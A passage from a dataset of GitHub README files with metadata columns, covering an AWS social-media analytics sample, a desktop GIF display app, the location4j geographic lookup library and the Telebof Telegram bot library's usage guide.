Feel free to continue sending messages to the Kinesis Social Media, or pulling data from X, however beware you donâ€™t know over your monthly threshold of the API requests

## Clean up

To delete all created stack resources you can run

```shell
cdk destroy --all
```

## License

This library is licensed under the MIT-0 License. See the LICENSE file.


## Disclaimer

This sample is not meant for deployment in production, and some security mechanisms, such as logging, have been disabled for cost optimization. However, if needed we encourage you to leverage [CDK Nag](https://github.com/cdklabs/cdk-nag) in order to identify and implement best practices for all the services deployed in the sample.

In this sample, if you are going to consume data from Twitter using a developer account, you will be interacting with public data coming from the feed. This sample takes no responsibility of the comments or opinions that could be consumed from the social media application

",0,7,4,5.0,"['uncover', 'social', 'medium', 'insight', 'real', 'time', 'use', 'amazon', 'managed', 'service', 'apache', 'flink', 'amazon', 'bedrock', 'architecture', 'solution', 'description', 'get', 'start', 'use', 'cdk', 'create', 'deploy', 'solution', 'stack', 'streamlit', 'application', 'clean', 'license', 'disclaimer']","['use', 'amazon', 'solution', 'uncover', 'social']",2.0,"[maven-compiler-plugin,maven-shade-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin,org.eclipse.m2e:lifecycle-mapping]",0.0,2.0,0.0
DEVS-MARKET/Desktop-GifDisplay,main,"
# Desktop GifDisplay ğŸ–¥ï¸

Due to the growing trend of ""Konata Desktop Dancing"", we decided to introduce our own application which is modeled on the original application from 2010 ğŸ”¥

## Basic information

This application displays a transparent window with a gif that you can freely move around the entire screen, it also has the option of adjusting the size and adding your own gif or music âš¡

We used Java 11 here, so no one should have any problems running this application

However, if you need Java 11, install it here: [Java 11 Install](https://www.oracle.com/java/technologies/javase/jdk11-archive-downloads.html)

#### Project information

You can find a full presentations of the project on our YouTube channel: [ğŸ‰ Free & Easy GifDisplay on Desktop (Dancing Konata) | DevsMarket](https://youtu.be/csvQRAPbdIs)

![App Screenshot](https://i.imgur.com/kUrMa9F.gif)

#### Project Suppot
If you need help, text to me:
- Discord: 0whitedev / 0WhiteDev#0001
- Discord Server: https://discord.gg/KhExwvqZb5
- Email: 0whitedev@gmail.com
## Authors

- [@0WhiteDev](https://github.com/0WhiteDev)
- [@DevsMarket](https://github.com/DEVS-MARKET)

",1,0,1,0.0,"['desktop', 'gifdisplay', 'basic', 'information', 'project', 'information', 'project', 'suppot', 'author']","['information', 'project', 'desktop', 'gifdisplay', 'basic']",2.0,"[maven-compiler-plugin,maven-shade-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin,org.openjfx:javafx-maven-plugin]",0.0,2.0,0.0
tomaytotomato/location4j,master,"# location4j ğŸŒ4ï¸âƒ£â™¨ï¸

![GitHub branch check runs](https://img.shields.io/github/check-runs/tomaytotomato/location4j/master)
[![Bugs](https://sonarcloud.io/api/project_badges/measure?project=tomaytotomato_location4j&metric=bugs)](https://sonarcloud.io/summary/new_code?id=tomaytotomato_location4j)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=tomaytotomato_location4j&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=tomaytotomato_location4j)
[![javadoc](https://javadoc.io/badge2/com.tomaytotomato/location4j/1.0.3/javadoc.svg)](https://javadoc.io/doc/com.tomaytotomato/location4j/1.0.3)
![GitHub commit activity](https://img.shields.io/github/commit-activity/m/tomaytotomato/location4j)
![GitHub License](https://img.shields.io/github/license/tomaytotomato/location4j)

location4j is a simple Java library designed for efficient and accurate geographical data lookups
for countries, states, and cities. ğŸ—ºï¸

Unlike other libraries, it operates without relying on third-party APIs, making it both
cost-effective and fast. ğŸï¸

Its built-in dataset provides quick lookups and no need for external HTTP calls. ğŸ“€

## Setup ğŸš€

Get the latest version of the location4j library by adding it to your Maven pom.xml

```xml

<dependency>
    <groupId>com.tomaytotomato</groupId>
    <artifactId>location4j</artifactId>
    <version>1.0.5</version>
</dependency>
```

**Gradle**

```gradle
implementation group: 'com.tomaytotomato', name: 'location4j', version: '1.0.5'
```

## Quick Example ğŸ—

```java
import com.tomaytotomato.SearchLocationService;

public class Main {

    public static void main(String[] args) {
        SearchLocationService searchLocationService = SearchLocationService.builder().build();

        // Find all locations named San Francisco
        List<Location> results = searchLocationService.search(""san francisco"");
        printResults(results);

        // Narrow search to the US
        results = searchLocationService.search(""san francisco, us"");
        printResults(results);

        // Narrow search further to California
        results = searchLocationService.search(""san francisco, us california"");
        printResults(results);
    }

    private static void printResults(List<Location> results) {
        System.out.println(""Locations found: "" + results.size());
        results.forEach(location -> {
            System.out.println(""Country: "" + location.getCountryName());
            System.out.println(""State: "" + location.getStateName());
            System.out.println(""City: "" + location.getCityName());
        });
    }
}

```

## Features ğŸ”¬

| Feature                         | Supported | Object   | Example                                                                         |
|---------------------------------|-----------|----------|---------------------------------------------------------------------------------|
| Search (free text)              | âœ…         | Location | `search(""kyiv"")` -> `""Kyiv, Ukraine, Europe, UA""`                               |
| Find All Countries              | âœ…         | Country  | `findAllCountries()` -> `[""Belgium"", ""Canada"", ...]`                            |
| Find Country by Id              | âœ…         | Country  | `findCountryById(1)` -> `[""Afghanistan""]`                                       |
| Find Country by ISO2 code       | âœ…         | Country  | `findCountryByISO2Code(""CA"")` -> `[""Canada""]`                                   |
| Find Country by ISO3 code       | âœ…         | Country  | `findCountryByISO3Code(""CAN"")` -> `[""Canada""]`                                  |
| Find Country by Name            | âœ…         | Country  | `findCountryByName(""Canada"")` -> `[""Canada""]`                                   |
| Find Country by Localised name  | âœ…         | Country  | `findCountryByLocalisedName(""Belgique"")` -> `[""Belgium""]`                       |
| Find Countries by State name    | âœ…         | Country  | `findAllCountriesByStateName(""Texas"")` -> `[""USA""]`                             |
| Find States by State name       | âœ…         | State    | `findAllStatesByStateName(""Texas"")` -> `[""Texas"", ""USA""]`                       |
| Find State by State Id          | âœ…         | State    | `findStateById(5)` -> `[""California"", ""USA""]`                                   |
| Find States by State code       | âœ…         | State    | `findAllStatesByStateCode(""CA"")` -> `[""California"", ""USA""]`                     |
| Find City by City Id            | âœ…         | City     | `findCityById(10)` -> `[""Los Angeles"", ""California""]`                           |
| Find City by latitude/longitude | âœ…         | City     | `findClosestCityByLatLong(30.438, -84.280)` -> `[""Tallahassee"", ""Florida""]`     |
| Find Cities by City name        | âœ…         | City     | `findAllCitiesByCityName(""San Francisco"")` -> `[""San Francisco"", ""California""]` |

ğŸŸ¢ location4j can parse free text strings with or without punctuation or capitalisation e.g.
> San Francisco, CA, USA
>
> ca united states san francisco
>
> US, San Francisco, california

ğŸŸ¢ Latitude/Longitude searches can use `double`, `BigDecimal`, or `String` inputs for both values;
the types must match (
you can't mix a `String` latitude with a `BigDecimal` or `double` longitude) but the API will accept
any of the three
types.

ğŸ”´ location4j cannot find a location based on a small town, street, or
zipcode/postcode.

## More Examples ğŸ§ª

**Lookup countries**

For simple lookups the `LocationService` can act like a repository, allow the retrieval of
countries, states and city information.

```java

import com.tomaytotomato.LocationService;

public class LocationServiceExample {

    public static void main(String[] args) {
        LocationService locationService = LocationService.builder().build();

        // Get all countries
        List<Country> countries = locationService.findAllCountries();

        // Filter European countries
        List<Country> europeanCountries = countries.stream()
                .filter(country -> ""Europe"".equals(country.getRegion()))
                .toList();

        // Find Afghanistan by ID
        Country afghanistan = locationService.findCountryById(1);

        // Find all cities named San Francisco
        List<City> cities = locationService.findAllCities(""San Francisco"");

    }
}

```

**Search locations**

Search any text for a location, the `SearchLocationService` can handle formatted or unformatted
text. It will try and find matches against a variety of keywords it has in its dataset.

```java

import com.tomaytotomato.SearchLocationService;

public class SearchLocationServiceExample {

    public static void main(String[] args) {
        SearchLocationService searchLocationService = SearchLocationService.builder()
            .withTextNormaliser(new DefaultTextNormaliser())
            .build();

        // Search for Santa Clara
        List<Location> results = searchLocationService.search(""Santa Clara"");

        // Search for Santa Clara in the USA
        List<Location> resultsUnitedStates = searchLocationService.search(""Santa Clara USA"");

        // Search for Santa Clara in California (it works with ISO2 or ISO3) codes
        List<Location> resultsCalifornia = searchLocationService.search(""Santa Clara US CA"");
    }
}

```

## Motivation ğŸŒ±

Parsing location data efficiently is crucial for many applications, yet it can be complex and
time-consuming.

Third-party services like Google Location API can be costly, and using large language models can
introduce significant latency.

location4j offers a practical solution with its own dataset, enabling fast and cost-effective
geographical lookups to a city/town level (which is sufficient in most cases).

This allows applications to be built without another external dependency and the overheads that come
with it.

I may add other functionality in the future if needed e.g. geolocation to nearest place, geofencing
etc.

## Credits ğŸ™

Country data sourced
from [dr5shn/countries-states-cities-database](https://github.com/dr5hn/countries-states-cities-database) [![License: ODbL](https://img.shields.io/badge/License-ODbL-brightgreen.svg)](https://opendatacommons.org/licenses/odbl/)

## License ğŸ“œ

[MIT License](https://choosealicense.com/licenses/mit/)

",6,4,3,15.0,"['setup', 'quick', 'example', 'feature', 'more', 'example', 'motivation', 'credit', 'license']","['example', 'setup', 'quick', 'feature', 'more']",3.0,"[com.diffplug.spotless:spotless-maven-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jacoco:jacoco-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,2.0,1.0
natanimn/Telebof,main,"# <p align=""center"">Telebo<i>f</i></p>
## <p align=""center""> Supported 7.7 Bot API </p> 
##


* [Installation](#installation)
* [Your First Echo Bot](#your-first-echo-bot)
* [Available Types](#available-types) 
* [Available Methods](#available-methods)
* [Handling Updates](#handling-updates)
* [Types of Handlers](#types-of-handlers)
* [Filtering Updates](#filtering-updates)
* [Markup](#markup)
    * [Reply Keyboard Markup](#replymarkup)
    * [Inline Keyboard Markup](#inlinekeyboardmarkup)
    * [Remove Reply Keyboard](#removereplykeyboard)
    * [Force Reply](#forcereply)
* [Inline Bot](#inline-bot)
* [Using Webhook](#using-webhook)
* [Advanced Usages](advanced-usages)
  * [Local Bot API Server](#local-bot-api-server)
  * [Logging](#logging)
  * [Proxy](#proxy)
* [Error Handling](#error-handling)
* [Conclusion](#conclusion)
  

## Installation

* Maven 

```xml
<dependecy>
    <groupId>et.telebof</groupId>
    <artifactId>telegrambot</artifactId>
    <version>1.13.2-alpha</version>
</dependecy>
```

* Grade

```groovy
implementation 'et.telebof:telegrambot:1.13.2-alpha'
```
### Your First Echo Bot

```java
import et.telebof.BotClient;

public class MyFirstEchoBot {
  static final String TOKEN = ""YOUR_BOT_TOKEN_HERE"";

  public static void main(String[] args) {
    final BotClient bot = new BotClient(TOKEN);

    // Listening for /start command
    bot.onMessage(filter -> filter.commands(""start""), (context, message) -> {
        context.reply(""Welcome!"").exec();
    });

    // Listening for any text
    bot.onMessage(filter -> filter.text(), (context, message) -> {
        context.reply(message.text).exec();
    });

    bot.run(); // finally run the bot
  }
}
```
**Do not worry if you do not understand what the above code mean, it will be explained in the next chapter.** 

## Available Types
All Telegram types are defined in `et.telebof.types`. And they are completely the same as Telegram types. 

Their set method is their camelCased name method

## Available Methods
All Telegram methods are defined in `et.telebof.request` and implemented in `et.telebof.BotContext` class.

These methods can be used in 2 ways: Inside handler using `context` parameter and Outside handler using `bot.context` instance.

##### Inside handler
No need to pass `chat_id` or `user_id` to the methods need it as argument using `context` argument or `bot.context` instance

##### Outside handler
`chat_id` or `user_id` must be passed to the methods need it as argument using `bot.context` instance

```java
/* Inside Handler */

// send message
context.sendMessage(""Hello, World"").exec(); // or
context.sendMessage(message.chat.id, ""Hello, World"").exec();

// The same as 

bot.context.sendMessage(""Hello, World"").exec();
bot.context.sendMessage(message.chat.id, ""Hello, World"").exec();

// send Photo
context.sendPhoto(new File(""photo.png"")).exec(); // or
context.sendPhoto(message.chat.id, new File(""photo.png"")).exec();

// The same as 

bot.context.sendPhoto(new File(""photo.png"")).exec(); // or
bot.context.sendPhoto(message.chat.id, new File(""photo.png"")).exec();


/* Outside Handler */

bot.context.sendMessage(123456789L, ""Hello, World"").exec();
bot.context.sendPhoto(123456789L, new File(""photo.png"")).exec();
```
**Assume that in our examples it is inside handler**

```java
// send photo
context.sendPhoto(new File(""photo.png"")).exec(); // or
context.sendPhoto(""FILE_ID"").exec();

// send audio
context.sendAudio(new File(""audio.mp3"")).exec();
context.sendAudio(""FILE_ID"").exec();

// send video
context.sendVideo(new File(""video.mp4"")).exec();
context.sendVideo(""FILE_ID"").exec();

// send voice
context.sendVoice(new File(""voice.ogg"")).exec();
context.sendVoice(""FILE_ID"").exec();

// send document
context.sendDocument(new File(""doc.pdf"")).exec();
context.sendDucument(""FILE_ID"").exec();

// send animation
context.sendAnimation(new File(""animation.gif"")).exec();
context.sendAnimation(""FILE_ID"").exec();

// send contact
context.sendContact(phone_number, first_name).exec();

// send poll
InputPollOption option1 = new InputPollOption(""option 1"");
InputPollOption option2 = new InputPollOption(""option 2"")
context.sendPoll(question, new InputPollOption[]{option1, option2}).exec();

// send invoice
LabeledPrice price1 = new LabeledPrice(label1, amount1);
context.sendInvoice(title, dscription, payload, currency, new LabeledPrice[]{price1}).exec();

// send media group
InputMediaPhoto media1 = new InputMediaPhoto(new File(""photo_1.png""));
InputMediaPhoto media2 = new InputMediaPhoto(new File(""photo_2.png""));
context.sendMediaGroup(new InputMedia[]{media1, media2}).exec();


// get me
User me = context.getMe().exec();
System.out.println(me.username);

// ban chat member
context.banChatMember(user_id).exec();

// leave chat
context.leaveChat().exec();
```

## Handling Updates
### Update
Update is an event that bot receives like incoming messages, pressing button.

Updates are handled by [registering one or more callback classes](#types-of-handlers). 

Each update has its own handler. These handlers take two parameters as argument: filter class 
and callback class. The filter class is a lambda class of `et.telebof.filter.FilterExecutor` takes `et.telebof.filter.Filter`
as an argument and returns `Boolean`, so that if the condition of this filter 
matches with the update sent from telegram, the callback class will be called and its body gets execute.

The callback class takes two parameters: `et.telebof.BotContext` class and type of class of an update which is being handled

Let's back to the first [echo bot](#your-first-echo-bot) example.

```java
import et.telebof.BotClient;

public class MyFirstEchoBot {
  static final String TOKEN = ""YOUR_BOT_TOKEN_HERE"";

  public static void main(String[] args) {
    final BotClient bot = new BotClient(TOKEN);

    bot.onMessage(filter -> filter.commands(""start""), (context, message) -> {
      context.reply(""Welcome!"").exec();
    });

    bot.onMessage(filter -> filter.text(), (context, message) -> {
      context.reply(message.text).exec();
    });

    bot.run();
  }
}
```
We have two handlers: `/start` command handler and `text` handler.

- The first handler handles `/start` command and send back a text `Welcome!`.
- The second handler handles any incoming **text** and echoes the text.
- The `reply` method is a shortage of `sendMessage` and replies message to the message.

- `exec()` meaning `execute` is an enclosing and request sender method. This means before ending and sending request, you can pass 
optional parameters and then send a request to telegram. For example `sendMessage` method has optional parameters 
`parse_mode`, `reply_markup`. So you can pass their value for these parameters and send request to telegram.

```java
import et.telebof.enums.ParseMode;

context.sendMessage(""*Hello, World*"")
        .parseMode(ParseMode.MARKDOWN)
        .exec();
```
Lastly we start our bot by using `run()` which does not take any parameter and run our bot via **long polling.** 

**IMPORTANT: All handlers are handled in the order in which they were registered.**

## Types of Handlers
There are 22 types of updates to be handled

#### Message Handler
```java
bot.onMessage((context, message) -> {}); 
```
#### CallbackQuery handler
```java
bot.onCallback((context, callback) -> {});
```
#### InlineQuery Handler
```java
bot.onInline((context, query) -> {} );
```
#### Poll Handler
```java
bot.onPoll((context, poll) -> {});
```
#### PollAnswer Handler
```java
bot.onPoll((context, poll_answer) -> {});
```
#### ShippingQuery Handler
```java
bot.onShipping((context, shipping) -> {});
```
#### ChannelPost Handler
```java
bot.onChannelPost((context, channel_post) -> {});
```
#### PreCheckoutQuery Handler
```java
bot.onPreCheckout((context, pre_checkout) -> {});
```
#### EditedMessage Handler
```java
bot.onEditedMessage((context, edited_message) -> {});
```
#### EditedChannelPost Handler
```java
bot.onEditedChannelPost((context, edited_channel_post) -> {});
```
#### MyChatMember Handler
```java
bot.onMychatMember((context, chat_updated) -> {});
```
#### ChatMember Handler
```java
bot.onChatMember((context, chat_member) -> {});
```
#### ChosenInlineResult Handler
```java
bot.onChosenInlineResult((context, chosen) -> {});
```
#### MessageReaction Handler
```java
bot.onReaction((context, reaction) -> {});
```
#### MessageReactionCount Handler
```java
bot.onReactionCount((context, reaction_count) -> {});
```
#### ChatBoost Handler
```java
bot.onChatBoost((context, chat_boost) -> {});
```
#### RemovedChatBoost Handler
```java
bot.onRemovedChatBoost((context, removed_chat_boost) -> {});
```
#### BusinessMessage Handler
```java
bot.onBusinessMessage((context, businnes_message) -> {});
```
#### BusinessConnection Handler
```java
bot.onBusinessConnection((context, business_connection) -> {});
```
#### EditedBusinessMessage Handler
```java
bot.onEditedBusinessMessage((context, edited_business_message) -> {});
```
#### DeletedBusinessMessage Handler
```java
bot.onDeletedBusinessMessage((context, deleted_business_message) -> {});
```

**If only callback class is passed to a handler, the filter class will return `true` by default**

```java
bot.onMessage((context, message) -> {});
```
The same as
```java
bot.onMessage(filter -> true, (context, message) -> {});
```

## Filtering Updates

In previous topic we have seen how to create handlers and how they work. In this section we will talk about how filters 
work and how we use them.

As previously discussed, all handlers take two parameters: filter class and callback class. 

The filter class is used for filtering content of updates and separate the same update by content they hold. 

### Predefined Filters 
- `filter.text()` - filter message is text  
- `filer.photo()` - filter message is photo 
- `filter.video()` - filter message is video
- `filter.voice()` - filter message is voice
- `filter.audio()` - filter message is audio
- `filter.animation()` - filter message is animation
- `filter.document()` - filter message is document
- `filter.videoNote()` - filter message is video note
- `filter.contact()` - filter message is contact
- `filter.loaction()` - filter message is location
- `filter.game()` - filter message is game
- `filter.venue()` - filter message is venue
- `filter.sticker()` - filter message is sticker
- `filter.dice()` - filter message is dice
- `filter.invoice()` - message is an invoice for a payment
- `filter.media()` - filter message is one of the following: photo, video, audio, sticker, video_note, voice, animation, document.
- `filter.passportData()` - message is Telegram passport data
- `filter.usersShared()` - filter users were shared with the bot
- `filter.chatShared()` - filter chat was shared with the bot
- `filter.newChatMember()` - filter new members joined or added to the group
- `filter.leftChatMember()` - filter member left from the group
- `filter.newChatPhoto()` - filter a chat photo was changed
- `filter.newChatTitle()` - filter a chat title was changed
- `filter.groupCreated()` - filter a group chat was created
- `filter.supergroupCreated()` - filter a supergroup chat was created
- `filter.channelCreated()` - filter a channel was created
- `filter.messageAutoDeleteTimerChanged()` - filter auto-delete timer settings changed in the chat
- `filter.migrated()` - filter the group/supergroup has been migrated to/from a supergroup/group
- `filter.chatBackgroundSet()` filter chat background set
- `filter.pinnedMessage()` - filter a message was pinned
- `filter.successfulPayment()` - filter message about successful payment
- `filter.refundedPayment()` - filter message about refunded payment 
- `filter.proximityAlertTrigged()` - filter a user in the chat triggered another user's proximity alert
- `filter.boostAdded()` - filter user boosted the chat
- `filter.giveaway()` - filter message is scheduled giveaway
- `filter.giveawayCreated()` - filter a scheduled giveaway was created
- `filter.giveawayCompleted()` -  a giveaway without public winners was completed
- `filter.forumTopicCreated()` - filter forum topic created
- `filter.forumTopicClosed()` - filter forum topic closed
- `filter.forumTopicEdited()` - filter forum topic edited
- `filter.forumTopicReopned()` - filter forum topic reopened
- `filter.webAppData()` - filter data sent by a Web App
- `filter.videoChatStarted()` - filter video chat was started in the chat
- `filter.videoChatEnded()` - filter video chat was ended in the chat
- `filter.videoChatParticipantsInvited()` - filter new participants invited to a video chat
- `filter.videoChatScheduled()` - filter video chat scheduled
- `filter.forwarded()` - filter message was forwarded
- `filter.replied()` - filter message was replied to another message
- `filter.repliedToStory()` - filter message was replied to chat story
- `filter.entities()` - filter message text contains entities(bold, italic, underline, mention, url, hashtag)
- `filter.quote()` - filter message text contains quote
- `filter.bot()` - filter user is bot
- `filter.emptyQuery()` - filter query is empty
- `filter.Private()` - filter the chat is `private`
- `filter.group()` - filter the chat type is `group`
- `filter.supergroup()` - filter chat type is `supergroup`
- `filter.channel()` - filter chat type is `channel`
- `filter.commands(String... commands)` - filter message is given commands.
- `filter.callbackData(String... datas)` - filter given callback_data belongs to the pressed button.  
- `filter.inlineQuery(String... queries)` - filter given query is queried
- `filter.customFilter(CustomFilter cf)` - filter given filter
- `filter.state(String state)` - filter current state is given state. Pass `*` for filtering any state
- `filter.texts(String... texts)` - filter given text matched with message text
- `filter.chatIds(Long... ids)` - filter given id matched with current chat's id
- `filter.fromIds(Long... ids)` - filter given id matched with current user's id
- `filter.chatUsernames(String... usernames)` - filter given username matched with current chat's username
- `filter.usernames(String... usernames)` - filter given username matched with current user's username
- `filter.regex(String pattern)`- regular expression filter for message text  

```java
// handles incoming texts
bot.onMessage(filter -> filter.text(), (context, message) -> {});

// handles incoming photos
bot.onMessage(filter -> filter.photo(), (context, message) -> {});


// handles incoming videos
bot.onMessage(filter -> filter.video(), (context, message) -> {});
```

```java
// handles message in chat with chat_id of 123456789
bot.onMessage(filter -> filter.chatIds(123456789L), (context, message) -> {});

// handles message from user whose id is 123456789 
bot.onMessage(filter -> filter.fromIds(123456789L), (context, message) -> {});

// handles message in chat username @this_chat
bot.onMessage(filter -> filter.chatUsernames(""this_chat""), (context, message) -> {});

// handles message from user whose username is @this_user
bot.onMessage(filter -> filter.usernames(""this_user""), (context, message) -> {});

### Filtering message text
Message text can be filtered by using the following methods: `filter.commands`, `filter.texts`, `filter.regex`.

#### Filtering command
```java
// handles /start command
bot.onMessage(filter -> filter.commands(""start""), (context, message) -> {});

// handles /help command
bot.onMessage(filter -> filter.commands(""help""), (context, message) -> {});
```

#### Filtering Text
```java
// handles hi text
bot.onMessage(filter -> filter.texts(""hi""), (context, message) -> {});

// handles hello text
bot.onMessage(filter -> filter.texts(""hello""), (context, message) -> {});
```

#### Filtering using Regular Expression
```java
// handles any text starts with hi 
bot.onMessage(filter -> filter.regex(""^hi""), (context, message) -> {});

// handles any text ends with bye
bot.onMessage(filter -> filter.regex(""bye$""), (context, message) -> {});
```


### Combining filters
You may want to handle `text` and `photo` in one handler or a `text` in different chats. To do so use logical operators
(&&, ||, !) and combine them together.

Here are some examples

```java
// handles incoming text in private chat
bot.onMessage(filter -> filter.text() && filter.Private(), (context, message) -> {});

// handles an incoming text or photo
bot.onMessage(filter -> filter.text() || filter.photo(), (context, message) -> {});

// handles incoming text in supergroup chat 
bot.onMessage(filter -> filter.text() && filter.supergroup(), (context, message) -> {});

// handles incoming audio or video in private chat
bot.onMessage(filter -> filter.Private() && (filter.audio() || filter.video()), (context, message) -> {});
```

### Writing your own filter
You can write your own filter using `filter.customFilter`.

This example will show you how you can write filters using `et.telebof.filters.CustomFilter` and `filter.customFilter`.

Let's write simple custom filter whether incoming text starts with `!` or not.
```java
import et.telebof.BotContext;
import et.telebof.filters.CustomFilter;
import et.telebof.handlers.MessageHandler;
import et.telebof.types.Message;
import et.telebof.types.Update;


// Filter whether the incoming message text starts with `!`. or not

class StartsWithFilter implements CustomFilter {
  @Override
  public boolean check(Update update) {
    return update.message.text.startsWith(""!"");
  }
}

public class FilterBot {

  static void startsWith(BotContext context, Message message){
      context.sendMessage(""Message starts with !"").exec();
  }

  public static void main(String[] args) {
      // ...
      bot.onMessage(filter -> filter.text() && filter.customFilter(new StartsWithFilter()), 
              FilterBot::startsWith);
  }
}
```

### Advanced Filters

There are some advanced filters for handling `pressing button` and `inline query`. These are
`filter.callbackData` and `filter.inlineQuery` respectively.

Example for handling inline button through its callback data using `filter.callbackData`

```java
// handles inline button which its callback data equals with ""a""
bot.onCallback(filter -> filter.callbackData(""a""), (context, callback) -> {
    context.answer(""You pressed A button!"").exec();
});
```

Example for handling inline query using `filter.inlineQuery`
```java
// handles an inline query which its query equals with a word ""hello""
bot.onInline(filter -> filter.inlineQuery(""hello""), (context, query) -> {});
```
[Sample](#inline-bot)

### State Filter
There is another special filter to make conversations with bot called `state filter`.
```java
bot.onMessage(filter -> filter.commands(""start""), (context, message) -> {
    context.sendMessage(""What is your name?"").exec();
    bot.setState(message.from.id, ""name""); // set our state to `name`. You can set whatever
});

bot.onMessage(filter -> filter.state(""name"") && filter.text(), (context, message) -> {     
    context.sendMessage(String.format(""Your name is %s"", message.text)).exec();
    context.clearState(message.from.id);
});
```


## Markups
### ReplyMarkup
Example for using reply markup

```java
import et.telebof.types.ReplyKeyboardMarkup;
import et.telebof.types.KeyboardButton;

ReplyKeyboardMarkup markup = new ReplyKeyboardMarkup()
        .resizeKeyboard(true); // resize keyboard
        
markup.add(""A"", ""B"", ""C""); // You can add String or 
markup.add(""D"", ""E""); 
markup.add(new KeyboardButton(""F"")); // KeybaordButton class

context.sendMssage(""Hello, World!"").replyMarkup(markup).exec();
```

### InlineKeyboardMarkup
example for using InlineKeyboardMarkup

```java
import et.telebof.types.InlineKeyboardButton;
import et.telebof.types.InlineKeyboardMarkup;

InlineKeybaordMarkup inlineMarkup = new InlineKeybaordMarkup();

inlineMarkup.addKeybaord(
  new InlineKeybaordButton(""A"").callbackData(""a""), 
  new InlineKeybaordButton(""C"").callbackData(""b""), 
  new InlineKeybaordButton(""Url"").url(""www.example.com"")
); // 3 keyboards on a row 

// also  possible
InlineKeybaordMarkup inlineMarkup = new InlineKeybaordMarkup(new InlineKeybaordButton[]{
  new InlineKeybaordButton(""A"").callbackData(""a""), 
  new InlineKeybaordButton(""B"").callbackData(""b""),    
  new InlineKeyboardButton(""Url"").url(""www.example.com"")
  
}, 2); // 2 row width. i.e 2 keyboards on a row at max

// also possible
InlineKeybaordMarkup inlineMarkup = new InlineKeybaordMarkup(new InlineKeybaordButton[][]{
    new InlineKeybaordButton[]{
      new InlineKeybaordButton(""A"").callbackData(""a""), 
      new InlineKeybaordButton(""B"").callbackData(""b"")
    }, 
    new InlineKeyboardButton[]{
      new InlineKeyboardButton(""Url"").url(""www.example.com"")
    } 
  } 
);

context.sendMessage(""Press one button"").replyMarkup(inlineMarkup).exec();
```

### ForceReply
```java
import et.telebof.types.ForceReply;

context.sendMessage(""Can you tell me your name please?"")
        .replyMarkup(new ForceReply())
        .exec();
```

### RemoveReplyKeyboard
```java
import et.telebof.types.ReplyKeyboardMarkup;

context.sendMessage(""There is no reply keyboard now"")
        .replyMarkup(new RemoveReplyKeybaord())
        .exec(); 
```

## Inline Bot

```java
import et.telebof.types.InlineQueryResult;
import et.telebof.types.InlineQueryResultArticle;
import et.telebof.types.InputTextMessageContent;


bot.onInline(filter -> filter.emptyQuery(), (context, query) -> {
    InlineQueryResultArticle article = new InlineQueryResultArticle(""1"")
            .title(""Write something"")
            .description(""click here"")
            .inputTextMessageContent(new InputTextMessageContent(""Please write something""));

    context.answerInline(new InlineQueryResult[]{article}).exec();
});
```

## Using Webhook

```java
import et.telebof.Webhook;
import java.io.File;

class MyWebhookBot {
  public static void main(String[] args) {
    Webhook webhook = new Webhook(""www.example.com"", ""/bot"");  // URL and path respectively
    //...
    bot.deleteWebhook(); // first delete webhook if any
    bot.setWebhook(webhook); // set webhook

    //... 
    bot.run(); // start our bot on webhook

  }
}
```

## Advanced Usage

### Local Bot API Server

```java
import et.telebof.BotClient;

String url = ""https://example.com/bot%s/%s"";
BotClient bot = new BotClient.Builder(TOKEN)
        .localBotApiUrl(url)
        .build();
```
**You have to log out your bot from the Telegram server before switching to your local API server using `bot.context.logOut().exec()`**

### Logging
log current status of the bot.
```java
import et.telebof.BotClient;

BotClient bot = new BotClient.Builder(TOKEN)
        .log(true)
        .build();
```

### Proxy

```java
import et.telebof.BotClient;
import java.net.InetSocketAddress;
import java.net.Proxy;

InetSocketAddress address = new InetSocketAddress(80, ""127.97.91""); //port and hostname respectively 

Proxy proxy = new Proxy(Proxy.Type.SOCKS, address);
BotClient bot = new BotClient
        .Builder(TOKEN)
        .proxy(proxy)
        .build();
```


Finally
```java
import et.telebof.BotClient;
import et.telebof.enums.ParseMode;
import et.telebof.enums.Updates;

BotClient bot = new BotClient.Builder(TOKEN)
        .log(true) // Log current status
        .skipOldUpdates(false) // Receive updates sent last 24 hours 
        .parseMode(ParseMode.HTML) // Default parse mode passed to sendXyz methods
        .limit(10) // Limit how many updates should be received at maximum per request 
        .useTestServer(false) // Using test server
        .timeout(30) // timeout
        .offset(-1) // offset
        .allowedUpdates(Updates.ALL) // Allowed updates
        .proxy(null) // proxy
        .build(); // build our client
```

## Error Handling

```java
import et.telebof.TelegramApiException;

try {     
    context.sendMessage(""Hello, World"").exec();    
} catch(TelegramApiException apiException){
    System.out.println(apiException.description);
}
```

## Conclusion

Finally, we now assume that you have basic understanding of this library in this brief tutorial, however, if you have any question or need 
support regarding this library, you have the following options

1. Ping us on [our official Telegram group](https://t.me/telebofchat). 
2. Ask questions by opening a [discussion](https://github.com/natanimn/Telebof/discussions/new)


And join [our official Telegram channel](https://t.me/telebof) for update news.

",25,1,1,1.0,"['p', 'center', 'telebo', 'i', 'f', 'p', 'center', 'support', 'bot', 'api', 'installation', 'your', 'first', 'echo', 'bot', 'available', 'type', 'available', 'method', 'inside', 'handler', 'outside', 'handler', 'handle', 'update', 'update', 'type', 'handler', 'message', 'handler', 'callbackquery', 'handler', 'inlinequery', 'handler', 'poll', 'handler', 'pollanswer', 'handler', 'shippingquery', 'handler', 'channelpost', 'handler', 'precheckoutquery', 'handler', 'editedmessage', 'handler', 'editedchannelpost', 'handler', 'mychatmember', 'handler', 'chatmember', 'handler', 'choseninlineresult', 'handler', 'messagereaction', 'handler', 'messagereactioncount', 'handler', 'chatboost', 'handler', 'removedchatboost', 'handler', 'businessmessage', 'handler', 'businessconnection', 'handler', 'editedbusinessmessage', 'handler', 'deletedbusinessmessage', 'handler', 'filter', 'update', 'predefined', 'filter', 'filter', 'message', 'text', 'filter', 'command', 'filter', 'text', 'filter', 'use', 'regular', 'expression', 'combine', 'filter', 'write', 'filter', 'advanced', 'filter', 'state', 'filter', 'markup', 'replymarkup', 'inlinekeyboardmarkup', 'forcereply', 'removereplykeyboard', 'inline', 'bot', 'use', 'webhook', 'advanced', 